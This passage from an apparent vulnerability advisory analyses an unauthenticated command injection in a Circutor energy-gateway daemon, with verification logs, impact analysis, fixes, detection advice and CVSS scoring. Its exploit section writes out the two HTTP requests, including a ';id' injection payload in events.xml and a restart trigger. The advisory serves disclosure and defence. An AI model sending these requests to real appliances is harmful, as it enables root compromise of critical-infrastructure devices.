event whose condition is false does not activate. As recorded in section 6, that single hop is
identified but was neither disassembled to sink depth nor executed.

### Data flow transformations and why none of them is a filter

The value that reaches `system()` passes through six transformations. Each is listed with the
question a reviewer should ask of it:

| # | Transformation | Location | Does it restrict shell metacharacters? |
|---|---|---|---|
| 1 | HTTP body capture into a 0x400-byte buffer | `FUN_0023ace0` | No — capture only |
| 2 | XML parse of the events document | `FUN_0023ace0` | No — element text is taken as-is |
| 3 | Persist to the events document path @0x774290 | `FUN_001d9e00` | No — serialisation |
| 4 | Re-read and load elements into object fields | `FUN_005484fc` | No — element-to-field copy |
| 5 | Wide-string copy through the sub-object vtable | `FUN_00548414` | No — buffer copy |
| 6 | `swprintf` concatenation with `L"%ls %ls"` | `FUN_00548414` | No — introduces a space, adds no quoting |

Nothing in the list is a validation step. The single space that transformation 6 inserts
between command and parameter is a *separator in the shell sense*, which is precisely why a
leading `;` in the parameter produces a clean second statement rather than a malformed single
token. The design is exploitable because the concatenation is faithful, not because it is
sloppy.

### Data flow capacity and payload budget

Two limits bound the payload:

- The receive buffer in the events handler is `0x400` (1024) bytes, which constrains the size
  of the accepted document body at that layer, subject to whatever the surrounding parser does
  with longer input — a behaviour the record does not characterise.
- The `swprintf` call takes `0x400` (1024) as its maximum character count, so the concatenated
  wide string is truncated at that bound. With a two-character `<command>` of `x` plus the
  separating space, roughly 1021 characters of parameter remain usable.

Both limits are far above what a compact payload needs. A marker-writing `id` redirect is 41
characters, which is exactly the length the verification harness measured when it converted the
recorded parameter to a wide string. A one-line reverse shell or a `wget`-and-execute dropper
fits with room to spare, so truncation is not a practical constraint on impact — only on the
length of an obfuscated payload. We did not empirically test truncation behaviour, and we do
not claim to know whether a truncated document is rejected or silently accepted.

### Data flow persistence

The chain writes to a persistent configuration document, which changes its operational
character relative to a request-scoped injection. The written event is re-read on every
subsequent engine start. That persistence is an inference, and it is labelled as one here
because section 9 lists both of the links it depends on among the things that were never
executed: the condition evaluator `FUN_004ce47c` was not run, and the loader chain from
`FUN_001e3554` to `FUN_0020acac` is established by cross-reference only. No engine restart
was performed during this research, so no re-fire was ever observed. Subject to that caveat,
the inference carries the following consequences:

- one unauthenticated write would yield execution on every later restart, not once;
- the payload would survive daemon restarts and appliance reboots for as long as the document
  is not rewritten;
- an operator's own legitimate restart, a watchdog event or a maintenance reboot could fire
  the payload without any further attacker action;
- detection by file-content inspection is straightforward, because the injected event remains
  present in `events.xml` in plaintext after the attack.

## 8. Exploit Construction

### Exploit construction overview

The exploit is two HTTP requests and one payload string. No credentials, no session cookie, no
token, no cross-site origin and no race condition are involved; both requests are issued
sequentially with no timing constraint between them, because the intermediate state is a file.

The proof of concept in `exploit/` implements exactly this and takes the target base URL and
the command to run as arguments. Its default command writes an `id` marker so that success or
failure can be determined by reading one file, which keeps the demonstration non-destructive
on equipment the tester is authorised to assess.

### Exploit construction step one, the configuration write

The reconstructed first request. It is labelled *reconstructed* deliberately: no request in
this research was ever delivered to a running `pwrstudio`, so this is what the proof of
concept emits, built from the route string at `0x76a4f3`'s sibling route strings and the
handler analysis in section 3, not a capture from a device.

```http
PUT /services/user/events.xml HTTP/1.1
Host: <lab-host>
Content-Type: application/xml
Content-Length: <len>

<event><condition>1==1</condition><actions><activate><shellExecute><command>x</command><parameter>;id >/tmp/circutor_eds_vuln_rce_marker;#</parameter></shellExecute></activate></actions></event>
```

Expected outcomes and what each means:

- `200` — the handler recorded both 401 and 200 outcomes, so a 200 is the write having
  been accepted. No other 2xx status appears in the record, so none is listed here.
- `401` — this is the branch whose selecting condition section 3 could not resolve. A 401 here
  would mean the deployment does reject anonymous writes, and the conditional 8.8 reading in
  section 12 becomes the applicable one for that device.
- `405` — the method check in `fcn.002403f0` refuses `PUT`; retry with `POST`, since the
  recorded accepted constants (`2` and `0x1000`) were never mapped to method names.
- `413` — the setup routine's 100 MiB body cap was hit, which for this tiny document would
  indicate a proxy-level problem rather than the documented cap.

### Exploit construction step two, the restart trigger

```http
GET /restart.xml HTTP/1.1
Host: <lab-host>
```

The response is not the objective and is not inspected for a success marker by the proof of
concept beyond reporting the status. The objective is the side effect: the handler calls
`FUN_001e3000`, which walks into the event loader chain of section 7, which re-reads the
events document the first request wrote, which builds the `XCEventActionShellExecute` object,
which calls `swprintf` and then `system()`.

The proof of concept falls back to `GET /reloadCfg.xml` if `restart.xml` fails. That fallback
is the gated variant discussed in section 6, so on a device with security enforcement enabled
the fallback is expected to be refused while the primary is not — a useful differential test
in its own right, and one that a defender can run to separate "the restart handler is ungated"
from "nothing on this device is gated".

### Exploit construction confirmation

Confirmation is out-of-band by design. The injected command redirects to a file, and the tester
reads that file afterwards:

```sh
cat /tmp/circutor_eds_vuln_rce_marker
uid=0(root) gid=0(root) groups=0(root)
```

An attacker without filesystem access would use the same primitive for an outbound channel
instead — a DNS or HTTP callback — which is why this finding is usable for blind exploitation
and not only for interactive testing. The two-step structure also supports a purely destructive
or purely persistent payload with no confirmation step at all.

### Exploit construction of the sink-call verification harness

Because the daemon's HTTP stack could not be started under emulation (section 9), the sink was
verified by constructing the action object by hand and calling the shipped function directly
through the debugger. The construction had to solve three problems specific to this binary.

**Problem one — call through PLT stubs, not dynamic symbols.** A stripped non-PIE ARM binary
run under `qemu-arm-static` with a cross-architecture debugger does not give the debugger
reliable visibility of shared-library symbol load addresses, so library calls are made through
the binary's own PLT entries at their fixed addresses:

```
malloc      @0x15ee8      (PLT entry, fixed - non-PIE image)
mbstowcs    @0x15828      (PLT entry, fixed)
sink        @0x548414     (FUN_00548414, in the main image)
```

All three addresses lie below the entry point `0x37394` or well inside the image, consistent
with the PLT sitting early in `.text` of a non-PIE executable.

**Problem two — break before the engine initialises.** The debugger stops the process at the
entry point, where the dynamic linker has already resolved `libc` and `libstdc++` but the
engine has not begun its own initialisation:

```
break *0x37394
```

**Problem three — neutralise the virtual copy.** `Execute`'s first action is an indirect call
through the sub-object's vtable slot at index 2, which in the real engine copies the parameter
into a managed buffer. Calling the real routine requires a fully constructed engine, which does
not exist in this harness. The fix is to plant a return-immediately instruction at that slot,
so the virtual call returns without effect and `Execute` proceeds to the concatenation with
`obj+0x2c` already pointing at the same wide string as `obj+0x20`:

```
vtable slot [2] = 0x37510         a "bx lr" instruction inside .text
                  0xe12fff1e      stored little-endian as 1e ff 2f e1
                  0x37510 - 0x37394 = 0x17c bytes past the entry point
```

**Object construction.** With those three problems solved, the harness allocates and fills the
object layout documented in section 5, converting the two narrow strings to wide with
`mbstowcs`:

```
obj        = malloc(...)                       the shellExecute action object
sub        = malloc(...)                       the sub-object
vt         = malloc(...)                       its vtable, slot [2] := 0x37510
cmd_w      = malloc(0x40 * 4); mbstowcs(cmd_w,   "x",                  0x40)
param_w    = malloc(0x40 * 4); mbstowcs(param_w, ";id >MARKER;#",      0x40)

obj + 0x10 = sub                               sub-object pointer
obj + 0x14 = cmd_w                             <command>
obj + 0x20 = param_w                           <parameter>
obj + 0x2c = param_w                           pre-set, since the virtual copy is a no-op

call ((int(*)(int))0x548414)(obj)              XCEventActionShellExecute::Execute
```

This is the same technique used in our published Cambium cnMatrix research, where a hardware
driver dependency likewise prevented the network stack from starting: when the daemon cannot
be made to listen, invoke the shipped sink function with the argument values the network path
would have produced. The technique's limitation is stated in section 9 rather than glossed.

## 9. Dynamic Verification

### Dynamic verification environment, stated exactly

This is the section a reader should trust least and check hardest, so it is written as an
inventory rather than as a narrative.

What ran, and where:

```
analysis host        a Linux x86-64 cloud virtual machine, harness running as root
                     <analysis-host>; no address, hostname or account is reproduced here

emulation            qemu-arm-static, USER MODE only (no full-system emulation,
                     no kernel, no device tree, no network stack for the guest)

target binary        ./usr/bin/pwrstudio - the shipped binary, byte-for-byte, extracted
                     from pwrstudio_24.11.14-r0-pss0_cortexa7hf-neon.ipk inside
                     LineEds-24.11.14-r0-PS-BUILDID.upgrade

loader sysroot       <armhf-sysroot> - an armhf prefix holding libc, libpthread,
                     librt, libm, libgcc_s and libstdc++.so.6.0.21, merged into one
                     directory tree. Where that root filesystem originally came
                     from is not established by the research record, so no provenance
                     is claimed for it here; it is recorded only as an armhf sysroot
                     carrying those libraries

debugger             gdb (multiarch), attaching to qemu's -g stub on port 1234

physical device      NONE. No Circutor hardware was used at any point.
network traffic      NONE sent to any pwrstudio instance. The daemon never served a
                     request in this research.
```

The launch line, with the two paths that identify the harness replaced by placeholders:

```sh
qemu-arm-static -L <armhf-sysroot> -g 1234 ./usr/bin/pwrstudio &
gdb -q -batch -x <harness-dir>/sink_vuln.gdb
```

### Dynamic verification of why the HTTP stack could not be started

The daemon has a hard dependency on a Freescale i.MX platform serial device. Under user-mode
emulation the dependency cannot be satisfied, and the failure mode is specific and
reproducible:

```
engine start
  -> serial initialisation thread: openat("/dev/ttymxc2") = -EACCES
     (the Freescale i.MX private serial device does not exist under qemu-user, and no
      device model is provided)
  -> initialisation thread loops on the failed open
  -> the engine-ready futex is never signalled
  -> the worker thread that would accept connections is never scheduled

observed side effect: a listening socket on port 1500 does come up and its accept
backlog exists, but no thread ever issues accept() or poll() against it, so no request
can be delivered and no response can be produced.
```

This is why the verification strategy is a sink call rather than an end-to-end request. It is
the same blocking pattern our Cambium cnMatrix research hit with a Marvell switch ASIC driver,
and the same technique resolved it. We record it in this much detail because it is the single
largest limitation of this advisory, and a reader is entitled to know precisely which link in
the chain was executed and which was only read.

### Dynamic verification result, the injection run

The debugger stopped the process at the entry point, built the object described in section 8,
and called the sink. Relevant lines of the recorded run, reproduced verbatim except where a
placeholder is noted:

```
Breakpoint 1, 0x00037394 in ?? ()
stopped at _start 0x00037394. calling sink...
alloc: obj=0x8fff10 sub=0x8fff58 vt=0x8fff70 cmd=0x8fff98 param=0x8fffb0
$1 = 1
$2 = 41
cmd_w0=0x78 cmd_w1=0x0
param_w0=0x3b param_w1=0x69 param_w2=0x64
$3 = 1
Execute returned: 1
```

Reading each line:

- `Breakpoint 1, 0x00037394` — the process stopped at the ELF entry point of the non-PIE
  image, exactly as required for the PLT calls to be well defined.
- `$1 = 1` — `mbstowcs` converted the one-character command `x` and returned a length of 1.
- `$2 = 41` — `mbstowcs` converted the parameter and returned a length of 41. The recorded
  parameter string, including the per-run suffix on the marker filename that we elide in this
  advisory, is exactly 41 characters long; the conversion return value independently confirms
  the payload that was loaded into the object, byte for byte.
- `cmd_w0=0x78 cmd_w1=0x0` — the first wide character is `0x78`, the ASCII code for `x`,
  followed by a terminator. The command field holds what it should.
- `param_w0=0x3b param_w1=0x69 param_w2=0x64` — the first three wide characters are `0x3b`,
  `0x69`, `0x64`: `;`, `i`, `d`. The parameter begins with the statement separator followed by
  the `id` command, confirming that the injection prefix survived the narrow-to-wide
  conversion intact rather than being encoded or escaped.
- `$3 = 1` — `FUN_00548414` returned 1, the constant this function returns on success. The
  sink completed without faulting.

The marker written by the injected command was then inspected:

```
=== MARKER CHECK (VULN) ===
=== MARKER CREATED (VULN) ===
-rw-r--r-- 1 root root 39 <timestamp> /tmp/circutor_eds_vuln_rce_<run-id>
--- content ---
uid=0(root) gid=0(root) groups=0(root)
```

Two substitutions are made in that listing and both are deliberate. The listing timestamp is
replaced by `<timestamp>` because this advisory reproduces no date. The marker filename's
per-run suffix is replaced by `<run-id>` for the same reason; the suffix identified the
verification run, not the target, and its elision is why the 41-character conversion length
above refers to the recorded payload rather than to the string as reproduced here.

The file size is a check worth stating because it is arithmetic, not assertion: the content
line `uid=0(root) gid=0(root) groups=0(root)` plus its trailing newline is exactly 39 bytes,
which matches the recorded size precisely. The file is owned `root:root` with mode `0644
(-rw-r--r--)`, which is what a redirect performed by a root-owned process produces.

### Dynamic verification result, the control run

A control run was performed with a benign parameter containing no shell metacharacter, to
establish that the marker in the injection run was produced by the injected statement and not
by some incidental behaviour of the harness or of `system()` itself:

```
CONTROL: stopped at _start 0x00037394
$1 = 1
$2 = 25
CONTROL cmd_w0=0x78 param_w0=0x62 param_w1=0x65
$3 = 1
CONTROL Execute returned: 1
=== MARKER CHECK (CONTROL) ===
CONTROL CLEAN: no marker created with benign param (confirms injection-specific)
```

- `$2 = 25` — the control parameter `benign_param_no_injection` is exactly 25 characters, and
  the conversion returned 25.
- `param_w0=0x62 param_w1=0x65` — `b`, `e`: the benign string, as expected, with no separator.
- `$3 = 1` — the sink again returned success, so the difference between the two runs is not
  whether `Execute` ran; it ran in both. `system()` was called in both cases.
- No marker was created. The sink executed `x benign_param_no_injection`, which fails as a
  single unknown command and writes nothing.

The control is what upgrades this from "we called a function and a file appeared" to "the file
appeared because of the injected statement". Both runs reached the sink; only the run whose
parameter began with `;` produced a command execution beyond the first token.

### Dynamic verification of the shell re-parse semantics on a separate workstation

A third, weaker but independent check replicated the sink's final step outside the emulated
binary: the exact string that `system()` receives, handed to a real `/bin/sh`. This check did
not run on the analysis host inventoried at the head of this section. That machine is a Linux
x86-64 virtual machine on which the harness ran as root, whereas this run printed a
non-root identity, so it necessarily happened somewhere else: on a separate workstation, a
third machine distinct from both the analysis host and the emulated target. The account whose
identity it printed is elided here, exactly as every other account identity in this package
is. What this third check proves is the re-parse behaviour that turns concatenation into
injection, with no dependency on the ARM binary at all; what it does not speak to is the
analysis host, the emulated daemon's privileges, or any device.

```
[*] self-test: replicate system("x ;<cmd>;#") sh -c semantics
[*] sh -c 'x ;id > /tmp/<harness-tmp>/marker;#'
[*] sh returncode 0
[+] VULN: marker created -> uid=<local-uid>(<local-user>) gid=<local-gid>(<local-group>)
[+] CONTROL: no marker with benign param (injection-specific)
[+] self-test PASSED: injection is real and injection-specific
```

Two honesty notes on this block. First, the identity it printed is that of an unprivileged
local account on this third machine — not root, and not the root-run analysis host
defined above; the placeholders replace it, and this run says nothing about device
privileges. Its only claim is about shell parsing. Second, the harness message that
announces an expected returncode of `127` is inaccurate for this payload shape and
the recorded returncode of `0` is correct: the trailing `;#` makes the last executed statement
the successful redirect, and POSIX defines the exit status of a sequential list as that of the
last command executed. A returncode of `0` therefore does not indicate that the injection
failed — it indicates the injected command succeeded.

### Dynamic verification limits, and what was not exercised

The following were **not** demonstrated dynamically, and no reader should infer otherwise:

- No end-to-end network exploitation. No HTTP request was ever sent to `pwrstudio`, on a
  device or under emulation. The unauthenticated write and the unauthenticated restart are
  **statically proven** from the route table, the handler decompilations and the caller
  census; they are not observed network behaviour.
- No physical device. No LineEds appliance was powered, connected, flashed or queried.
- No full-system emulation. User-mode `qemu-arm-static` only, so no kernel, no device drivers,
  no network stack and no `nginx` front end were present.
- The XML parser was not exercised. The events document was never loaded by
  `FUN_0023ace0`, `FUN_001d9e00` or `FUN_005484fc`; the harness populated the action object's
  fields directly with the values those functions would have written.
- The condition evaluator `FUN_004ce47c` was not executed, so the assumption that `1==1`
  activates the event rests on identification and on analogy with the sibling engine, not on a
  run.
- The event loader chain from `FUN_001e3554` to `FUN_0020acac` was not executed. It is
  established by cross-reference only.
- The authentication gate `FUN_001a93cc` was not executed with a real request context, so the
  fail-open behaviour at `perm != 0x15` and at toggle-off is a decompilation reading, not an
  observation.
- The security-toggle default was not measured, for the reason given in section 3.
- The `root:root` ownership of the marker reflects the harness account, not a device account.

What the verification does establish, at full strength, is the most important single link: that
the shipped `XCEventActionShellExecute::Execute` function, in the shipped binary, called with
the field values the documented XML schema produces, reaches `system()` and executes an
attacker-chosen statement — with a benign control run that produces nothing. Everything
upstream of that call is static analysis of high quality, but it is static analysis.

## 10. Reachability and Security Impact

### Reachability from the network

Reachability requires nothing beyond network access to the management interface. There is no
delivery precondition of the kind that weakens many chained findings: the payload does not need
a file already resident on the target, a co-resident workload, a race window, a memory-layout
guess, or a preceding vulnerability. The injected command travels inside the body of the first
of the two requests, and the second request supplies only control. Both requests are ordinary
HTTP with no special headers, no cookies and no timing constraint between them, because the
state that connects them is a file the product itself writes.

On the evidence recorded in section 3, both routes are reachable without credentials:

- the events write handler and its dispatcher contain no call to the permission gate or to the
  validity predicate, and neither function's address falls within the 197-caller set of the
  gate;
- the restart handler's only precondition is the validity predicate, which the dispatcher's
  own setup routine satisfies for every request before the handler is entered.

This reaches every deployment in which the management plane is reachable by the attacker. For
an OT appliance that typically means the control or metering VLAN, the segment hosting the
energy-management server, a site-to-site tunnel to a corporate network, and — where the
reverse proxy has been published for remote access — the internet.

### Reachability under an enforced-security configuration

The conditional case deserves its own paragraph because it is the one a defender with a
hardened device will ask about. Suppose the security toggle is enabled, the events write
handler's unresolved 401 branch does reject anonymous clients, and the operator has configured
credentials. The chain then requires a valid low-privilege or operator credential rather than
none. Nothing else about it changes: the sink performs no sanitisation, the daemon still runs
with its own privileges, and the command still executes. That reading is scored as a
credential-required variant in section 12.

Note what does *not* change even in that case. The `perm != 0x15` branch of the permission
gate returns success without any check, whatever the toggle says. That is a defect in the gate
itself and it applies to every handler that passes a permission constant other than `0x15`. The
research record does not enumerate which of the roughly 28 routes fall into that class, and we
do not claim that any specific one of them is a second path to command execution; but a vendor
review should treat it as a separate, configuration-independent finding in its own right.

### Reachability across builds, models and firmware revisions

Only firmware `24.11.14-r0`, engine variant `pss0`, was extracted, disassembled and executed.
Every offset in this advisory is specific to that build and should not be assumed to hold on
another.

Wider applicability is inference and is labelled as such. Two facts point towards a family:
the engine carries a variant marker in its own package name (`pss0`), which implies the
existence of other variants of the same engine; and the class inventory —
`XCEventActionShellExecute`, `XCEventDriver`, `XCEventServer`, `XCEventSystem`,
`XCEventServerGroup` — is an engine framework, not a per-model implementation. The same
framework shipped in the vendor's Windows platform under the same action name and the same
concatenation format. A different LineEds firmware revision, a gateway model with a different
`pss` variant, or another Circutor appliance embedding this engine should therefore be assumed
potentially affected until it is individually verified. No such verification was performed, no
second image was extracted and no second build was disassembled. Defenders should validate
their own build rather than rely on this one row of the version space.

### Reachability impact on the appliance and on the OT segment

Impact once the chain completes is arbitrary operating-system command execution on an
industrial energy gateway, with the daemon's own privileges — recorded as root and argued in
section 5. On the evidence of this research that means:

- **Confidentiality.** Every measurement, configuration, credential store, certificate and key
  on the appliance becomes readable, including whatever the gateway holds to authenticate to
  the energy-management back office and to any upstream metering protocol endpoints. A
  compromised gateway is also an ideal passive collection point: it sees the measurement
  traffic it forwards.
- **Integrity.** Measurement data can be altered in transit or at rest before it reaches the
  back office. For an energy-data system this is not merely tampering with logs: forged
  consumption, generation or power-quality figures propagate into whatever consumes them —
  reporting, settlement, alarm thresholds, control decisions — and are hard to distinguish
  from real data because they arrive through the legitimate path. Event configuration itself
  can be rewritten, and firmware can be pushed through the same management plane that this
  chain abuses, since `/upgrade.cgi` is a route on the same daemon.
- **Availability.** The daemon owns the restart and reload primitives that the attack itself
  uses; an attacker can reboot the appliance on demand, stop measurement collection, drop
  configuration or wedge the engine, producing a data outage in the metering path.
- **Persistence and lateral movement.** A written event fires on every subsequent engine
  start, which is a persistence mechanism built into the product rather than one an attacker
  has to improvise. From the appliance, the attacker stands inside the OT segment with a
  foothold that security tooling typically treats as trusted instrumentation.

For an appliance positioned in electrical distribution, the aggregate is a complete compromise
of a field device in a critical-infrastructure network by an unauthenticated peer, reachable
with two HTTP requests and no exploitation reliability concerns.

## 11. Fix Recommendations

### Fix recommendations addressing the injection root cause

1. **Remove the shell from the execution path.** Replace `system()` in
   `XCEventActionShellExecute::Execute` with `execve()` or `posix_spawn()` and an explicit
   argument vector, so the configured command is passed as one opaque argument list rather
   than as shell text. This eliminates the class, not the instance: no separator, quote,
   substitution or comment construct survives the removal of the parser that gives it meaning.
   The `%ls %ls` concatenation should disappear with it, since a two-element argument vector
   has no need to join strings at all.
2. **If shell execution must be retained, constrain both elements against an allowlist.**
   Validate `<command>` as a path resolving to an executable in an allowlisted directory, and
   validate `<parameter>` against a strict character allowlist, rejecting at minimum `;`, `|`,
   `&`, `` ` ``, `$`, `<`, `>`, `(`, `)`, `{`, `}`, newline, carriage return and backslash.
   Apply the check at the point of construction (`FUN_00548414`) and not only at load time, so
   a document written by any means is still refused.
3. **Validate on write, against a schema, not on load.** The events document should be
   schema-validated when `FUN_0023ace0` accepts it, rejecting unknown element names, unknown
   action types and any character outside the permitted set for a command or parameter. A
   write-side schema check also converts the currently unexplained 401 branch into an explicit,
   documented rejection path, which removes the ambiguity section 3 records.
4. **Reconsider whether a raw shell action belongs in a gateway build at all.** A field
   appliance that collects and forwards energy data has little operational need for an
   operator-configurable arbitrary-command action. Gating `shellExecute` behind an explicit
   administrative enablement flag, defaulting to unavailable, and restricting it to a curated
   list of vendor-supplied maintenance scripts would remove most of the attack surface while
   retaining legitimate use.

### Fix recommendations addressing the authorization root cause

5. **Make the permission gate fail closed.** The first branch of `FUN_001a93cc` —
   `if (perm != 0x15) return SUCCESS;` — should return a denial for any permission value the
   gate does not recognise, and an unrecognized value should also be logged. A gate that grants
   by default on unknown input inverts the entire authorization model of the product.
6. **Remove the toggle from the authorization decision for control routes.** Device restart,
   configuration reload, event-configuration write and firmware upgrade are administrative
   operations that should require authentication unconditionally. A "security" switch that can
   switch authentication off for them is not a hardening option; if the toggle must remain for
   compatibility, it should control only low-sensitivity read routes, and administrative routes
   should refuse to honour it.
7. **Move authorization into the dispatcher.** The gate is currently called by 197 individual
   handlers, which means every new handler is unauthenticated until its author remembers
   otherwise — and the two handlers in this chain are exactly the ones that did not. Enforcing
   authorization once in `fcn.002403f0`'s equivalent dispatch stage, with an explicit
   per-route table entry declaring the required permission, makes omission impossible and
   turns the default from "open" into "declared".
8. **Run the daemon with least privilege.** A process that serves an HTTP management interface
   should not hold the account that owns the appliance's configuration and firmware paths.
   Splitting the network-facing handler from the privileged action executor, and dropping the
   daemon to a dedicated unprivileged account with narrowly-scoped write access, converts a
   command injection from full device compromise into a bounded failure.

### Fix recommendations for operators, until a fixed build exists

9. Restrict the management interface to a dedicated out-of-band management network, and
   firewall port `1500` and the reverse-proxy front end to a short allowlist of management
   hosts. This appliance should never be reachable from a business VLAN, a site-to-site tunnel
   or the internet.
10. Place the management plane behind an authenticating reverse proxy or a VPN that terminates
    before the appliance, so that anonymous HTTP cannot reach the events or restart routes at
    all.
11. Inspect the events configuration on every appliance and alert on change. Look for a
    `shellExecute` action whose command is not a known maintenance script, and for any
    parameter containing `;`, `|`, `` ` ``, `$(`, `>` or a newline. Because the injected event
    persists in the document in plaintext, this inspection is a reliable detector for both
    compromise and attempted compromise.
12. Monitor reverse-proxy and daemon logs for `PUT` or `POST` to `/services/user/events.xml`
    and for requests to `restart.xml` or `reloadCfg.xml` from hosts that are not management
    stations. A write followed within seconds by a restart request from the same source is the
    signature of this chain.

## 12. CWE and CVSS

### CWE classification

- **CWE-78 — Improper Neutralization of Special Elements used in an OS Command ('OS Command
  Injection').** Primary. An externally-influenced value from an XML configuration document is
  concatenated into a command string passed to `system()` with no neutralization of shell
  metacharacters. The defect is at the concatenation in `FUN_00548414`, not in the parser that
  supplied the value.
- **CWE-306 — Missing Authentication for Critical Function.** Co-primary, and the reason this
  is an unauthenticated finding rather than a post-authentication one. Writing the event
  configuration and forcing an engine restart are both critical functions, and on the recorded
  evidence neither route invokes the product's authorization gate.
- **CWE-285 — Improper Authorization.** This label is added by this advisory's own
  classification; the CWE set recorded in the research for this finding is CWE-78 and
  CWE-306 only. The fact behind the label is recorded: the gate's own design returns success
  without a check at `perm != 0x15`, and the toggle-off branch returns success, so the gate
  fails open in two independent ways for the 197 handlers that do call it.
- **CWE-20 — Improper Input Validation.** Also added by this advisory's own
  classification and not carried in the research record's CWE set. The events document is
  accepted without schema validation, which is what allows an arbitrary action type and
  arbitrary element text to be persisted.
- **CWE-250 / CWE-269 — Execution with Unnecessary Privileges / Improper Privilege
  Management.** Also added by this advisory's own classification. These bear on remediation
  priority rather than on the defect: the daemon's privilege level is what converts a command
  injection into full appliance compromise. They are recorded as contributing weaknesses and
  are not the reason for the score.
- **CWE-798-adjacent concerns are out of scope.** The research record references a hardcoded
  key material finding in the firmware as a separate matter, noted there as a local privilege
  mechanism rather than a remote one, and it is not part of this chain. We make no claim about
  it here.

### CWE and CVSS derivation, metric by metric

Each metric is derived from a documented fact, not from the finding's headline.

- **Attack Vector: Network (`AV:N`).** Both steps are HTTP requests to the daemon's management
  interface, reachable across a network segment or, where the reverse proxy is published, from
  anywhere.
- **Attack Complexity: Low (`AC:L`).** There is no attacker-unsatisfiable precondition: the
  payload is inline in the request body, there is no race, no memory-layout dependency, no
  requirement for a file to be pre-placed on the target, and no dependency on another
  vulnerability. The two requests can be issued in either order of timing — the state between
  them is a file the product itself persists. An `AC:H` reading is not defensible here.
- **Privileges Required: None (`PR:N`) — primary.** Rests on three pieces of binary evidence
  rather than on a configuration assumption: the 197-caller census of the permission gate,
  which excludes both handlers in this chain; the restart handler's decompilation, whose only
  guard is a request/response validity predicate; and the events handler and dispatcher
  decompilations, which contain no authorization call. Section 3 records the counter-evidence
  we found — an unexplained 401 branch in the events handler — and section 12 carries a
  credential-required conditional score to account for it.
- **User Interaction: None (`UI:N`).** No operator action, no click, no session, no
  coincidence of timing is needed. The restart is issued by the attacker, not awaited from an
  administrator.
- **Scope: Unchanged (`S:U`).** The command executes inside the authority that the vulnerable
  component already holds: the daemon and the appliance operating system are one authorization
  domain, and no sandbox, container, virtualization boundary or separate security realm is
  crossed to obtain it. A reader who treats the appliance OS as a distinct realm from the
  management daemon would score `S:C`; that reading is arithmetically different and we do not
  adopt it, and we say so rather than leaving the choice implicit.
- **Confidentiality: High (`C:H`).** Arbitrary command execution with the daemon's privileges
  reads everything on the appliance, including measurement data, credentials, keys and
  certificates.
- **Integrity: High (`I:H`).** Arbitrary command execution rewrites configuration, persisted
  event definitions, measurement data in flight and, through the same management plane,
  firmware.
- **Availability: High (`A:H`).** The attacker controls the restart and reload primitives the
  chain itself uses, and can stop or wedge measurement collection at will.

### CWE and CVSS scores

| Scenario | Vector | Base score |
|---|---|---|
| Primary — unauthenticated, management plane reachable, both route handlers ungated as analysed | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | **9.8 Critical** |
| Conditional — device rejects anonymous configuration writes (security enforced, or the unresolved handler rejection branch is active), any valid operator credential suffices | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` | **8.8 High** |
| Not adopted — Scope read as Changed, i.e. the appliance OS counted as a separate realm | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` | **10.0 Critical** |
| Not adopted — Attack Complexity raised despite the absence of any attacker precondition | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` | **8.1 High** |

All four values above are computed with the CVSS 3.1 base metric algorithm, Scope-Changed rows
using the 3.1 impact formula `7.52*(ISS-0.029) - 3.25*(ISS*0.9731-0.02)**13`, and each is
rounded up to the nearest tenth. We lead with the 9.8 / 8.8 pair: 9.8 as the primary reading
because both handlers in the chain are demonstrably outside the permission gate's caller set,
and 8.8 as the conditional reading because one branch of the events handler can emit a 401 and
we could not determine from the binary what selects it. Publishing only the 9.8 would imply a
certainty about the write path that the decompilation does not fully supply; publishing only
the 8.8 would understate the case for every device on which the anonymous write succeeds.

A `PR:H` reading (7.2 High) is not carried, because nothing in the record indicates that the
configuration write or the restart route demands an administrator rather than any authenticated
principal; the product's credential model beyond the presence of `/api/v1/login` and JWT-shaped
response strings was not recovered.

### CWE and CVSS reconciliation with the recorded score

The research record carries a base score of 9.8 together with the vector
`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`. Recomputing that vector with the CVSS 3.1 base
algorithm yields 9.8, so the recorded number is arithmetically correct and this advisory
adopts it as primary. The reconciliation that matters is not the arithmetic, however, but the
grounding: the record derives `PR:N` from an asserted factory default for the security toggle,
for which no shipped artifact exists, whereas this advisory derives `PR:N` from the handler
call census and the two decompilations, which are artifact evidence. The score is unchanged;
the reason it is that score has been replaced with one that survives scrutiny, and the
asserted default has been demoted to an unverified annotation in section 3.

Two recorded figures are corrected or narrowed here. The record's phrasing that security being
disabled by default makes "all routes unauthenticated" is not published, because it is
unsupported and because it is unnecessary for this chain. And the record's `root` attribution
is retained but relabelled as inference from the daemon's role, since the observed
`uid=0(root)` is the harness account rather than a device measurement.

### CWE and CVSS note on independence and identifier status

This finding is our own and is not a re-derivation of published work. The survey recorded
during the research phase found no published vulnerability identifier for the LineEds product
or for this component in the sources checked, and no identifier of any kind is claimed or
referenced in this advisory.

The distinction from the same vendor's other product is material and is set out explicitly so
that no reader conflates the two. Circutor's Windows PowerStudio SCADA WAVE platform is the
subject of separate research of our own, already published, covering a different engine binary
on a different operating system. The comparison:

| Dimension | LineEds `pwrstudio` (this advisory) | Windows PowerStudio SCADA WAVE |
|---|---|---|
| Binary | `/usr/bin/pwrstudio`, 9.1 MB Linux ARM C++, stripped non-PIE | `PwrStudio.exe`, native C++ PE32+ (64-bit) engine |
| Platform | Linux, ARMv7-A cortexa7hf-neon appliance | Windows x86-64, service under LocalSystem |
| Sink API | libc `system()` via `/bin/sh -c` | Win32 process-creation APIs |
| Concatenation format | `"%ls %ls"` UTF-32LE at `0x7cc2d0` | `"%ls %ls"` — same engine design lineage |
| Configuration store | `events.xml` under `/services/user/` over HTTP | `*.xeve` event files written via a storage service |
| Authorization weakness | ungated handlers plus a gate that fails open | forged-token acceptance in a shared identity library |
| Licence gate | compiled with `CONFIG_NO_HASP` | HASP dongle gating |

The shared `"%ls %ls"` format and the shared `shellExecute` action name are evidence of one
engine design carried across two platforms, not of shared code: one is a native 32-bit ARM
Linux C++ build calling libc and the other is a native 64-bit C++ Windows build calling Win32.
One correction is owed on that second cell. The research record's comparison row described the
sibling engine as a managed .NET x86 build, and that characterization is wrong: it
contradicts our own already-published analysis of the same Windows product, which identifies
`PwrStudio.exe` as a native C++ PE32+ (64-bit) engine — its `shellExecute` executor sits
